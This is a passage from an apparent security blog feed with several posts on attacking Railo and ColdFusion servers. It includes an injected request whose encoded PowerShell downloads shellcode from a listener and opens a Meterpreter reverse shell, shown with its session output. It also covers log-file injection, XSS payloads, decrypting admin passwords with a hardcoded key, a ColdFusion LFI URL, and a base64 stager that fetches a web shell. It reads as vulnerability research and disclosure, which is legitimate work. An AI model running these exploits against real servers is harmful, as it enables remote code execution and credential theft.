+GET /railo-context/admin/web.cfm?action=internal.savedata&amp;action2=addfavorite&amp;favorite=%3A%3Ccfoutput%3E%3Ccfexecute%20name%3D%22c%3A%5Cwindows%5Csystem32%5Ccmd.exe%22%20arguments%3D%22%2Fc%20PowerShell.exe%20-Exec%20ByPass%20-Nol%20-Enc%20aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA2ADoAOAAwADAAMAAvAEkAbgB2AG8AawBlAC0AUwBoAGUAbABsAGMAbwBkAGUALgBwAHMAMQAnACkA%22%20timeout%3D%2210%22%20variable%3D%22output%22%3E%3C%2Fcfexecute%3E%3C%2Fcfoutput%3E%27 HTTP/1.1
+</code></p>
+
+<p>Once injected, we hit our session page and pop a shell:</p>
+
+<p>```
+payload => windows/meterpreter/reverse_https
+LHOST => 192.168.1.6
+LPORT => 4444
+[<em>] Started HTTPS reverse handler on <a href="https://0.0.0.0:4444/">https://0.0.0.0:4444/</a>
+[</em>] Starting the payload handler&hellip;
+[<em>] 192.168.1.102:50122 Request received for /INITM&hellip;
+[</em>] 192.168.1.102:50122 Staging connection for target /INITM received&hellip;
+[<em>] Patched user-agent at offset 663128&hellip;
+[</em>] Patched transport at offset 662792&hellip;
+[<em>] Patched URL at offset 662856&hellip;
+[</em>] Patched Expiration Timeout at offset 663728&hellip;
+[<em>] Patched Communication Timeout at offset 663732&hellip;
+[</em>] Meterpreter session 1 opened (192.168.1.6:4444 &ndash;> 192.168.1.102:50122) at 2014-03-24 00:44:20 -0600</p>
+
+<p>meterpreter > getpid
+Current pid: 5064
+meterpreter > getuid
+Server username: bryan-PC\bryan
+meterpreter > sysinfo
+Computer        : BRYAN-PC
+OS              : Windows 7 (Build 7601, Service Pack 1).
+Architecture    : x64 (Current Process is WOW64)
+System Language : en_US
+Meterpreter     : x86/win32
+meterpreter >
+```</p>
+
+<p>Because I&rsquo;m using Powershell, this method won&rsquo;t work in Windows XP or Linux systems, but it&rsquo;s trivial to use the next method for that (net user/useradd).</p>
+
+<p>The second method is to simply write out the result of a command into a file and then retrieve it.  This can trivially be done with the following:</p>
+
+<p><code>
+':&lt;cfoutput&gt;&lt;cfexecute name="c:\windows\system32\cmd.exe" arguments="/c dir &gt; ./webapps/www/WEB-INF/railo/context/output.cfm" timeout="10" variable="output"&gt;&lt;/cfexecute&gt;&lt;/cfoutput&gt;'
+</code></p>
+
+<p>Note that we&rsquo;re writing out to the start of web root and that our output file is a CFM; this is a requirement as the web server won&rsquo;t serve up flat files or txt&rsquo;s.</p>
+
+<p>Great, we&rsquo;ve verfied this works.  Now, how to actually figure out what the hell this session file is called?  As previously noted, the file is saved as either <code>web-[VALUE].cfm</code> or <code>server-[VALUE].cfm</code>, the prefix coming from the interface you&rsquo;re accessing it from.  I&rsquo;m going to step through the code used for this, which happens to be a healthy mix of CFML and Java.</p>
+
+<p>We&rsquo;ll start by identifying the session file on my local Windows XP machine: <code>web-a898c2525c001da402234da94f336d55.cfm</code>.  This is stored in <code>www\WEB-INF\railo\context\admin\userdata</code>, of which <code>admin\userdata</code> is accessible from the web root, that is, we can directly access this file by hitting <code>railo-context/admin/userdata/[file]</code> from the browser.</p>
+
+<p>When a favorite it saved, <code>internal.savedata.cfm</code> is invoked and searches through the given list for the function we&rsquo;re performing:</p>
+
+<p>```
+<cfif listFind("addfavorite,removefavorite", url.action2) and structKeyExists(url, "favorite")></p>
+
+<pre><code>&lt;cfset application.adminfunctions[url.action2](url.favorite) /&gt;
+    &lt;cflocation url="?action=#url.favorite#" addtoken="no" /&gt;
+</code></pre>
+
+<p>```</p>
+
+<p>This calls down into <code>application.adminfunctions</code> with the specified action and favorite-to-save.  Our addfavorite function is as follows:</p>
+
+<p>```
+<cffunction name="addfavorite" returntype="void" output="no"></p>
+
+<pre><code>    &lt;cfargument name="action" type="string" required="yes" /&gt;
+    &lt;cfset var data = getfavorites() /&gt;
+    &lt;cfset data[arguments.action] = "" /&gt;
+    &lt;cfset setdata('favorites', data) /&gt;
+&lt;/cffunction&gt;
+</code></pre>
+
+<p>```</p>
+
+<p>Tunneling yet deeper into the rabbit hole, we move forwards into setdata:</p>
+
+<p>```
+<cffunction name="setdata" returntype="void" output="no"></p>
+
+<pre><code>    &lt;cfargument name="key" type="string" required="yes" /&gt;
+    &lt;cfargument name="value" type="any" required="yes" /&gt;
+    &lt;cflock name="setdata_admin" timeout="1" throwontimeout="no"&gt;
+        &lt;cfset var data = loadData() /&gt;
+        &lt;cfset data[arguments.key] = arguments.value /&gt;
+        &lt;cfset writeData() /&gt;
+    &lt;/cflock&gt;
+&lt;/cffunction&gt;
+</code></pre>
+
+<p>```</p>
+
+<p>This function actually reads in our data file, inserts our new favorite into the data array, and writes it back down.  Our question is &ldquo;how do you know the file?&rdquo;, so naturally we need to head into loadData:</p>
+
+<p>```
+ <cffunction name="loadData" access="private" output="no" returntype="any"></p>
+
+<pre><code>    &lt;cfset var dataKey = getDataStoreName() /&gt;
+        [..snip..]
+</code></pre>
+
+<p>```</p>
+
+<p>And yet deeper we move, into getDataStoreName:</p>
+
+<p>```
+<cffunction name="getDataStoreName" access="private" output="no" returntype="string"></p>
+
+<pre><code>    &lt;cfreturn "#request.admintype#-#getrailoid()[request.admintype].id#" /&gt;
+&lt;/cffunction&gt;
+</code></pre>
+
+<p>```</p>
+
+<p>At last we&rsquo;ve reached the apparent event horizon of this XML black hole; we see the return will be of form <code>web-#getrailoid()[web].id#</code>, substituting in web for request.admintype.</p>
+
+<p>I&rsquo;ll skip some of the digging here, but lets fast forward to Admin.java:</p>
+
+<p>```
+ private String getCallerId() throws IOException {</p>
+
+<pre><code>    if(type==TYPE_WEB) {
+        return config.getId();
+    }
+</code></pre>
+
+<p>```</p>
+
+<p>Here we return the ID of the caller (our ID, for reference, is what we&rsquo;re currently tracking down!), which calls down into config.getId:</p>
+
+<p>```
+   @Override</p>
+
+<pre><code>public String getId() {
+    if(id==null){
+        id = getId(getSecurityKey(),getSecurityToken(),false,securityKey);
+    }
+    return id;
+}
+</code></pre>
+
+<p>```</p>
+
+<p>Here we invoke getId which, if null, calls down into an overloaded getId which takes a security key and a security token, along with a boolean (false) and some global securityKey value.  Here&rsquo;s the function in its entirety:</p>
+
+<p>```</p>
+
+<pre><code>public static String getId(String key, String token,boolean addMacAddress,String defaultValue) {
+
+    try {
+        if(addMacAddress){// because this was new we could swutch to a new ecryption // FUTURE cold we get rid of the old one?
+            return Hash.sha256(key+";"+token+":"+SystemUtil.getMacAddress());
+        }
+        return Md5.getDigestAsString(key+token);
+    }
+    catch (Throwable t) {
+        return defaultValue;
+    }
+}
+</code></pre>
+
+<p>```</p>
+
+<p>Our ID generation is becoming clear; it&rsquo;s essentially the MD5 of key + token, the key being returned from <code>getSecurityKey</code> and the token coming from <code>getSecurityToken</code>.  These functions are simply getters for private global variables in the ConfigImpl class, but tracking down their generation is fairly trivial.  All state initialization takes place in ConfigWebFactory.java.  Let&rsquo;s first check out the security key:</p>
+
+<p>```
+private static void loadId(ConfigImpl config) {</p>
+
+<pre><code>    Resource res = config.getConfigDir().getRealResource("id");
+    String securityKey = null;
+    try {
+        if (!res.exists()) {
+            res.createNewFile();
+            IOUtil.write(res, securityKey = UUIDGenerator.getInstance().generateRandomBasedUUID().toString(), SystemUtil.getCharset(), false);
+        }
+        else {
+            securityKey = IOUtil.toString(res, SystemUtil.getCharset());
+        }
+    }
+</code></pre>
+
+<p>```</p>
+
+<p>Okay, so our key is a randomly generated UUID from the safehaus library.  This isn&rsquo;t very likely to be guessed/brute-forced, but the value is written to a file in a consistent place.  We&rsquo;ll return to this.</p>
+
+<p>The second value we need to calculate is the security token, which is set in ConfigImpl:</p>
+
+<p>```
+public String getSecurityToken() {</p>
+
+<pre><code>    if(securityToken==null){
+        try {
+            securityToken = Md5.getDigestAsString(getConfigDir().getAbsolutePath());
+        }
+        catch (IOException e) {
+            return null;
+        }
+    }
+    return securityToken;
+}
+</code></pre>
+
+<p>```</p>
+
+<p>Gah!  This is predictable/leaked!  The token is simply the MD5 of our configuration directory, which in my case is <code>C:\Documents and Settings\bryan\My Documents\Downloads\railo-express-4.0.4.001-jre-win32\webapps\www\WEB-INF\railo</code>  So let&rsquo;s see if this works.</p>
+
+<p>We MD5 the directory (<code>20132193c7031326cab946ef86be8c74</code>), then prefix this with the random UUID (securityKey) to finally get:</p>
+
+<p><code>
+$ echo -n "3ec59952-b5de-4502-b9d7-e680e5e2071820132193c7031326cab946ef86be8c74" | md5sum
+a898c2525c001da402234da94f336d55  -
+</code></p>
+
+<p>Ah-ha!  Our session file will then be web-a898c2525c001da402234da94f336d55.cfm, which exactly lines up with what we&rsquo;re seeing:</p>
+
+<p><img src="/images/posts/2014/railo/railo_session_proof.jpg"></p>
+
+<p>I mentioned that the config directory is leaked; default Railo is pretty promiscuous:</p>
+
+<p><img src="/images/posts/2014/railo/railo_bad_page.jpg"></p>
+
+<p>As you can see, from this we can derive the base configuration directory and figure out one half of the session filename.  We now turn our attention to figuring out exactly what the securityKey is; if we recall, this is a randomly generated UUID that is then written out to a file called <code>id</code>.</p>
+
+<p>There are two options here; one, guess or predict it, or two, pull the file with an LFI.  As alluded to in part one, we can set the error handler to any file on the system we want.  As we&rsquo;re in the mood to discuss post-authentication issues, we can harness this to fetch the required <code>id</code> file containing this UUID:</p>
+
+<p><img src="/images/posts/2014/railo/railo-error-handler-lfi.jpg"></p>
+
+<p>When we then access a non-existant page, we trigger the template and the system returns our file:</p>
+
+<p><img src="/images/posts/2014/railo/railo-uuid.jpg"></p>
+
+<p>By combining these specific vectors and inherit weaknesses in the Railo architecture, we can obtain post-authentication RCE without forcing the server to connect back.  This can be particularly useful when the Task Scheduler just isn&rsquo;t an option.  This vulnerability has been implemented into clusterd as an auxiliary module, and is available in the latest dev build (0.3.1).  A quick example of this:</p>
+
+<p><img src="/images/posts/2014/railo/railo-log-injection-exec.jpg"></p>
+
+<p>I mentioned briefly at the start of this post that there were &ldquo;several&rdquo; post-authentication RCE vulnerabilities.  Yes.  Several.  The one documented above was fun to find and figure out, but there is another way that&rsquo;s much cleaner.  Railo has a function that allows administrators to set logging information, such as level and type and location.  It also allows you to create your own logging handlers:</p>
+
+<p><img src="/images/posts/2014/railo/railo-log-settings.jpg"></p>
+
+<p>Here we&rsquo;re building an HTML layout log file that will append all ERROR logs to the file.  And we notice we can configure the path and the title.  And the log extension.  Easy win.  By modifying the path to <code>/context/my_file.cfm</code> and setting the title to <code>&lt;cfdump var="#session#"&gt;</code> we can execute arbitrary commands on the file system and obtain shell access.  The file is not created once you create the log, but once you select Edit and then Submit for some reason.  Here&rsquo;s the HTML output that&rsquo;s, by default, stuck into the file:</p>
+
+<p>```
+&lt;!DOCTYPE HTML PUBLIC &ldquo;&ndash;//W3C//DTD HTML 4.01 Transitional//EN&rdquo; &ldquo;<a href="http://www.w3.org/TR/html4/loose.dtd">http://www.w3.org/TR/html4/loose.dtd</a>&rdquo;>
+<html>
+<head>
+<title><cfdump var="#session#"></title></p>
+
+
+
+<p></head>
+<body bgcolor="#FFFFFF" topmargin="6" leftmargin="6"></p>
+
+<hr size="1" noshade>
+
+
+<p>Log session start time Mon Jun 30 23:06:17 MDT 2014<br></p>
+
+<br>
+
+
+<table cellspacing="0" cellpadding="4" border="1" bordercolor="#224466" width="100%">
+<tr>
+<th>Time</th>
+<th>Thread</th>
+<th>Level</th>
+<th>Category</th>
+<th>Message</th>
+</tr>
+</table>
+
+
+<br>
+
+
+<p></body></html>
+```</p>
+
+<p>Note our title contains the injected command.  Here&rsquo;s execution:</p>
+
+<p><img src="/images/posts/2014/railo/railo-log-inject-execution.jpg"></p>
+
+<p>Using this method we can, again, inject a shell without requiring the use of any reverse connections, though that option is of course available with the help of the <code>cfhttp</code> tag.</p>
+
+<p>Another fun post-authentication <em>feature</em> is the use of data sources.  In Railo, you can craft a custom data source, which is a user-defined database abstraction that can be used as a filesystem.  Here&rsquo;s the definition of a MySQL data source:</p>
+
+<p><img src="/images/posts/2014/railo/railo-datasource-def.jpg"></p>
+
+<p>With this defined, we can set all client session data to be stored in the database, allowing us to harvest session ID&rsquo;s and plaintext credentials (see part one).  Once the session storage is set to the created database, a new table will be created (cf_session_data) that will contain all relevant session information, including symmetrically-encrypted passwords.</p>
+
+<p><img src="/images/posts/2014/railo/railo-database-session-info.jpg"></p>
+
+<p>Part three and four of this series will begin to dive into the good stuff, where we&rsquo;ll discuss several pre-authentication vulnerabilities that we can use to obtain credentials and remote code execution on a Railo host.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[railo security - part one - intro]]></title>
+    <link href="http://hatRiot.github.io/blog/2014/06/25/railo-security-part-one/"/>
+    <updated>2014-06-25T14:00:00-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2014/06/25/railo-security-part-one</id>
+    <content type="html"><![CDATA[<p><em>Part one &ndash; intro</em><br/>
+<em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two &ndash; post-authentication rce</a></em><br/>
+<em><a href="http://hatriot.github.io/blog/2014/08/23/railo-security-part-three/">Part three &ndash; pre-authentication lfi</a></em><br/>
+<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four &ndash; pre-authentication rce</a></em></p>
+
+<p><a href="http://getrailo.org/">Railo</a> is an open-source alternative to the popular Coldfusion application server, implementing a FOSSy CFML engine and application server.  It emulates Coldfusion in a variety of ways, mainly features coming straight from the CF world, along with several of it&rsquo;s own unique features (clustered servers, a plugin architecture, etc).  In this four-part series, we&rsquo;ll touch on how Railo, much like Coldfusion, can be used to gain access to a system or network of systems.  I will also be examining several pre-authentication RCE vulnerabilities discovered in the platform during this audit.  I&rsquo;ll be pimping <a href="https://github.com/hatRiot/clusterd">clusterd</a> throughout to exemplify how it can help achieve some of these goals.  These posts are the result of a combined effort between myself and Stephen Breen (@breenmachine).</p>
+
+<p>I&rsquo;ll preface this post with a quick rundown on what we&rsquo;re working with; public versions of Railo run from versions 3.0 to 4.2, with 4.2.1 being the latest release as of posting.  The code is also freely available on <a href="github.com/getrailo/railo">Github</a>; much of this post&rsquo;s code samples have been taken from the 4.2 branch or the master.  Hashes:</p>
+
+<p><code>
+$ git branch
+* master
+$ git rev-parse master
+694e8acf1a762431eab084da762a0abbe5290f49
+</code></p>
+
+<p>And a quick rundown of the code:</p>
+
+<p>```
+$ cloc ./</p>
+
+<pre><code>3689 text files.
+3571 unique files.                                          
+ 151 files ignored.
+</code></pre>
+
+<h2><a href="http://cloc.sourceforge.net">http://cloc.sourceforge.net</a> v 1.60  T=7.74 s (452.6 files/s, 60622.4 lines/s)</h2>
+
+<h2>Language                       files          blank        comment           code</h2>
+
+<p>Java                            2786          66639          69647         258015
+ColdFusion                       315           5690           3089          35890
+ColdFusion CFScript              352           4377            643          15856
+XML                               22            526            563           5773
+Javascript                        14             46            252            733
+Ant                                4             38             70            176
+DTD                                4            283            588            131
+CSS                                5             52             16             77</p>
+
+<h2>HTML                               1              0              0              1</h2>
+
+<h2>SUM:                            3503          77651          74868         316652</h2>
+
+<p>```</p>
+
+<p>Railo has two separate administrative web interfaces; server and web.  The two interfaces segregate functionality out into these categories; managing the actual server and managing the content served up by the server.  Server is available at <code>http://localhost:8888/railo-context/admin/server.cfm</code> and web is available at <code>http://localhost:8888/railo-context/admin/web.cfm</code>.  Both interfaces are configured with a single, shared password that is set AFTER the site has been initialized.  That is, the first person to hit the web server gets to choose the password.</p>
+
+<h4>Authentication</h4>
+
+<p>As stated, authentication requires only a single password, but locks an IP address out if too many failed attempts are performed.  The exact logic for this is as follows (<code>web.cfm</code>):</p>
+
+<p>```
+<cfif loginPause and StructKeyExists(application,'lastTryToLogin') and IsDate(application.lastTryToLogin) and DateDiff("s",application.lastTryToLogin,now()) LT loginPause></p>
+
+<pre><code>    &lt;cfset login_error="Login disabled until #lsDateFormat(DateAdd("s",loginPause,application.lastTryToLogin))# #lsTimeFormat(DateAdd("s",loginPause,application.lastTryToLogin),'hh:mm:ss')#"&gt;
+&lt;cfelse&gt;
+</code></pre>
+
+<p>```</p>
+
+<p>A <code>Remember Me For</code> setting allows an authenticated session to last until logout or for a specified amount of time.  In the event that a cookie is saved for X amount of time, Railo actually encrypts the user&rsquo;s password and stores it as the authentication cookie.  Here&rsquo;s the implementation of this:</p>
+
+<p><code>
+&lt;cfcookie expires="#DateAdd(form.rememberMe,1,now())#" name="railo_admin_pw_#ad#" value="#Encrypt(form["login_password"&amp;ad],cookieKey,"CFMX_COMPAT","hex")#"&gt;
+</code></p>
+
+<p>That&rsquo;s right; a static key, defined as <code>&lt;cfset cookieKey="sdfsdf789sdfsd"&gt;</code>, is used as the key to the CFMX_COMPAT encryption algorithm for encrypting and storing the user&rsquo;s password client-side.  This is akin to simply base64'ing the password, as symmetric key security is dependant upon the secrecy of this shared key.</p>
+
+<p>To then verify authentication, the cookie is decrypted and compared to the current password (which is also known; more on this later):</p>
+
+<p>```
+<cfif not StructKeyExists(session,"password"&request.adminType) and StructKeyExists(cookie,'railo_admin_pw_#ad#')></p>
+
+<pre><code>&lt;cfset fromCookie=true&gt;
+&lt;cftry&gt;
+    &lt;cfset session["password"&amp;ad]=Decrypt(cookie['railo_admin_pw_#ad#'],cookieKey,"CFMX_COMPAT","hex")&gt;
+    &lt;cfcatch&gt;&lt;/cfcatch&gt;
+&lt;/cftry&gt;
+</code></pre>
+
+<p></cfif>
+```</p>
+
+<p>For example, if my stored cookie was <code>RAILO_ADMIN_PW_WEB=6802AABFAA87A7</code>, we could decrypt this with a simple CFML page:</p>
+
+<p><code>
+&lt;cfset tmp=Decrypt("6802AABFAA87A7", "sdfsdf789sdfsd", "CFMX_COMPAT", "hex")&gt;
+&lt;cfdump var="#tmp#"&gt;
+</code></p>
+
+<p>This would dump my plaintext password (which, in this case, is &ldquo;default&rdquo;).  This ups the ante with XSS, as we can essentially steal plaintext credentials via this vector.  Our cookie is graciously set without HTTPOnly or Secure: <code>Set-Cookie: RAILO_ADMIN_PW_WEB=6802AABFAA87A7;Path=/;Expires=Sun, 08-Mar-2015 06:42:31 GMT</code>._</p>
+
+<p>Another worthy mention is the fact that the plaintext password is stored in the session struct, as shown below:</p>
+
+<p><code>
+&lt;cfset session["password"&amp;request.adminType]=form["login_password"&amp;request.adminType]&gt;
+</code></p>
+
+<p>In order to dump this, however, we&rsquo;d need to be able to write a CFM file (or code) within the context of web.cfm.  As a test, I&rsquo;ve placed a short CFM file on the host and set the error handler to invoke it.  <code>test.cfm</code>:</p>
+
+<p><code>
+&lt;cfdump var="#session#"&gt;
+</code></p>
+
+<p>We then set the template handler to this file:</p>
+
+<p><img src="/images/posts/2014/railo/railo-error-handler.jpg"></p>
+
+<p>If we now hit a non-existent page, <code>/railo-context/xx.cfm</code> for example, we&rsquo;ll trigger the cfm and get our plaintext password:</p>
+
+<p><img src="/images/posts/2014/railo/railo-session-plaintext.jpg"></p>
+
+<h4>XSS</h4>
+
+<p>XSS is now awesome, because we can fetch the server&rsquo;s plaintext password.  Is there XSS in Railo?</p>
+
+<p><img src="/images/posts/2014/railo/railo-xss.jpg"></p>
+
+<p>Submitting to a CFM with malicious arguments triggers an error and injects unsanitized input.</p>
+
+<p>Post-authentication search:</p>
+
+<p><img src="/images/posts/2014/railo/railo-xss2.jpg"></p>
+
+<p>Submitting malicious input into the search bar will effectively sanitize out greater than/less than signs, but not inside of the saved form.  Injecting <code>"&gt;&lt;/form&gt;&lt;img src=x onerror=alert(document.cookie)&gt;</code> will, of course, pop-up the cookie.</p>
+
+<p>How about stored XSS?</p>
+
+<p><img src="/images/posts/2014/railo/railo-xss3.jpg"></p>
+
+<p>A malicious mapping will trigger whenever the page is loaded; the only caveat being that the path must start with a /, and you cannot use the script tag.  Trivial to get around with any number of different tags.</p>
+
+<p>Speaking of, let&rsquo;s take a quick look at the sanitization routines.  They&rsquo;ve implemented their own routines inside of <code>ScriptProtect.java</code>, and it&rsquo;s a very simple blacklist:</p>
+
+<p>```
+  public static final String[] invalids=new String[]{</p>
+
+<pre><code>    "object", "embed", "script", "applet", "meta", "iframe"
+};
+</code></pre>
+
+<p>```</p>
+
+<p>They iterate over these values and perform a simple compare, and if a <em>bad</em> tag is found, they simply replace it:</p>
+
+<p>```</p>
+
+<pre><code>if(compareTagName(tagName)) {
+            if(sb==null) {
+                sb=new StringBuffer();
+                last=0;
+            }
+            sb.append(str.substring(last,index+1));
+            sb.append("invalidTag");
+            last=endIndex;
+        }
+</code></pre>
+
+<p>```</p>
+
+<p>It doesn&rsquo;t take much to evade this filter, as I&rsquo;ve already described.</p>
+
+<p>CSRF kinda fits in here, how about CSRF?  Fortunately for users, and unfortunately for pentesters, there&rsquo;s not much we can do.  Although Railo does not enforce authentication for CFML/CFC pages, it does check read/write permissions on all accesses to the backend config file.  This is configured in the Server interface:</p>
+
+<p><img src="/images/posts/2014/railo/railo-server-pw.jpg"></p>
+
+<p>In the above image, if <code>Access Write</code> was configured to <code>open</code>, any user could submit modifications to the back-end configuration, including password resets, task scheduling, and more.  Though this is sufficiently locked down by default, this could provide a nice backdoor.</p>
+
+<h4>Deploying</h4>
+
+<p>Much like Coldfusion, Railo features a task scheduler that can be used to deploy shells.  A run of this in clusterd can be seen below:</p>
+
+<p>```
+$ ./clusterd.py -i192.168.1.219 -a railo -v4.1 &mdash;deploy ./src/lib/resources/cmd.cfml &mdash;deployer task &mdash;usr-auth default</p>
+
+<pre><code>    clusterd/0.2.1 - clustered attack toolkit
+        [Supporting 6 platforms]
+</code></pre>
+
+<p> [2014-05-01 10:04PM] Started at 2014-05-01 10:04PM
+ [2014-05-01 10:04PM] Servers' OS hinted at windows
+ [2014-05-01 10:04PM] Fingerprinting host &lsquo;192.168.1.219&rsquo;
+ [2014-05-01 10:04PM] Server hinted at &lsquo;railo&rsquo;
+ [2014-05-01 10:04PM] Checking railo version 4.1 Railo Server&hellip;
+ [2014-05-01 10:04PM] Checking railo version 4.1 Railo Server Administrator&hellip;
+ [2014-05-01 10:04PM] Checking railo version 4.1 Railo Web Administrator&hellip;
+ [2014-05-01 10:04PM] Matched 3 fingerprints for service railo
+ [2014-05-01 10:04PM]   Railo Server (version 4.1)
+ [2014-05-01 10:04PM]   Railo Server Administrator (version 4.1)
+ [2014-05-01 10:04PM]   Railo Web Administrator (version 4.1)
+ [2014-05-01 10:04PM] Fingerprinting completed.
+ [2014-05-01 10:04PM] This deployer (schedule_task) requires an external listening port (8000).  Continue? [Y/n] >
+ [2014-05-01 10:04PM] Preparing to deploy cmd.cfml..
+ [2014-05-01 10:04PM] Creating scheduled task&hellip;
+ [2014-05-01 10:04PM] Task cmd.cfml created, invoking&hellip;
+ [2014-05-01 10:04PM] Waiting for remote server to download file [8s]]
+ [2014-05-01 10:04PM] cmd.cfml deployed to /cmd.cfml
+ [2014-05-01 10:04PM] Cleaning up&hellip;
+ [2014-05-01 10:04PM] Finished at 2014-05-01 10:04PM
+```</p>
+
+<p>This works almost identically to the Coldfusion scheduler, and should not be surprising.</p>
+
+<p>One feature Railo has that isn&rsquo;t found in Coldfusion is the Extension or Plugin architecture; this allows custom extensions to run in the context of the Railo server and execute code and tags.  These extensions do not have access to the cfadmin tag (without authentication, that is), but we really don&rsquo;t need that for a simple web shell.  In the event that the Railo server is configured to not allow outbound traffic (hence rendering the Task Scheduler useless), this could be harnessed instead.</p>
+
+<p>Railo allows extensions to be uploaded directly to the server, found here:</p>
+
+<p><img src="/images/posts/2014/railo/railo-plugin-upload.jpg"></p>
+
+<p>Developing a plugin is sort of confusing and not exacty clear via their provided Github documentation, however the simplest way to do this is grab a pre-existing package and simply replace one of the functions with a shell.</p>
+
+<p>That about wraps up part one of our dive into Railo security; the remaining three parts will focus on several different vulnerabilities in the Railo framework, and how they can be lassoed together for pre-authentication RCE.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[LFI to shell in Coldfusion 6-10]]></title>
+    <link href="http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/"/>
+    <updated>2014-04-02T14:10:04-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion</id>
+    <content type="html"><![CDATA[<p>ColdFusion has <a href="http://www.blackhatlibrary.net/Coldfusion_hacking">several</a> very popular LFI&rsquo;s that are often used to fetch CF hashes, which can then be passed or cracked/reversed.  A lesser use of this LFI, one that I haven&rsquo;t seen documented as of yet, is actually obtaining a shell.  When you can&rsquo;t crack or pass, what&rsquo;s left?</p>
+
+<p>The less-than-obvious solution is to exploit CFML&rsquo;s parser, which acts much in the same way that PHP does when used in HTML.  You can embed PHP into any HTML page, at any location, because of the way the PHP interpreter searches a document for executable code.  This is the foundational basis of log poisoning.  CFML acts in much the same way, and we can use these LFI&rsquo;s to inject CFML and execute it on the remote system.</p>
+
+<p>Let&rsquo;s begin by first identifying the LFI; I&rsquo;ll be using ColdFusion 8 as example.  CF8&rsquo;s LFI lies in the locale parameter:</p>
+
+<p><code>
+http://192.168.1.219:8500/CFIDE/administrator/enter.cfm?local=../../../../../../../../ColdFusion8\logs\application.log%00en
+</code></p>
+
+<p>When exploited, this will dump the contents of <code>application.log</code>, a logging file that stores error messages.</p>
+
+<p><img src="/images/posts/2014/cf_log.jpg"></p>
+
+<p>We can write to this file by triggering an error, such as attempting to access a nonexistent CFML page.  This log also fails to sanitize data, allowing us to inject any sort of characters we want; including CFML code.</p>
+
+<p>The idea for this is to inject a simple stager payload that will then pull down and store our real payload; in this case, a web shell (something like fuze).  The stager I came up with is as follows:</p>
+
+<p><code>
+&lt;cfhttp method='get' url='#ToString(ToBinary('aHR0cDovLzE5Mi4xNjguMS45Nzo4MDAwL2NtZC5jZm1s'))#' path='#ExpandPath(ToString(ToBinary('Li4vLi4v')))#' file='cmd.cfml'&gt;
+</code></p>
+
+<p>The <code>cfhttp</code> tag is used to execute an HTTP request for our real payload, the URL of which is base64&rsquo;d to avoid some encoding issues with forward slashes.  We then expand the local path to <code>../../</code> which drops us into <code>wwwroot</code>, which is the first directory accessible from the web server.</p>
+
+<p>Once the stager is injected, we only need to exploit the LFI to retrieve the log file and execute our CFML code:</p>
+
+<p><img src="/images/posts/2014/cf_log_fetch.jpg"></p>
+
+<p>Which we can then access from the root directory:</p>
+
+<p><img src="/images/posts/2014/cf_log_exec.jpg"></p>
+
+<p>A quick run of this in clusterd:</p>
+
+<p>```
+$ ./clusterd.py -i 192.168.1.219 -a coldfusion -p8500 -v8 &mdash;deployer lfi_stager &mdash;deploy ./src/lib/resources/cmd.cfml</p>
+
+<pre><code>    clusterd/0.2.1 - clustered attack toolkit
+        [Supporting 5 platforms]
+</code></pre>
+
+<p> [2014-04-02 11:28PM] Started at 2014-04-02 11:28PM
+ [2014-04-02 11:28PM] Servers' OS hinted at windows
+ [2014-04-02 11:28PM] Fingerprinting host &lsquo;192.168.1.219&rsquo;
+ [2014-04-02 11:28PM] Server hinted at &lsquo;coldfusion&rsquo;
+ [2014-04-02 11:28PM] Checking coldfusion version 8.0 ColdFusion Manager&hellip;
+ [2014-04-02 11:28PM] Matched 1 fingerprints for service coldfusion
+ [2014-04-02 11:28PM]   ColdFusion Manager (version 8.0)
+ [2014-04-02 11:28PM] Fingerprinting completed.
+ [2014-04-02 11:28PM] Injecting stager&hellip;
+ [2014-04-02 11:28PM] Waiting for remote server to download file [7s]]
+ [2014-04-02 11:28PM] cmd.cfml deployed at /cmd.cfml
+ [2014-04-02 11:28PM] Finished at 2014-04-02 11:28PM</p>
+
+<p>```</p>
+
+<p>The downside to this method is remnance in a log file, which cannot be purged unless the CF server is shutdown (except in CF10).  It also means that the CFML file, if using the web shell, will be hanging around the filesystem.  An alternative is to inject a web shell that exists on-demand, that is, check if an argument is provided to the LFI and only parse and execute then.</p>
+
+<p>A working deployer for this can be found in the latest release of clusterd (v0.2.1).  It is also worth noting that this method is applicable to other CFML engines; details on that, and a working proof of concept, in the near future.</p>
+]]></content>
+  </entry>
+  
+</feed>
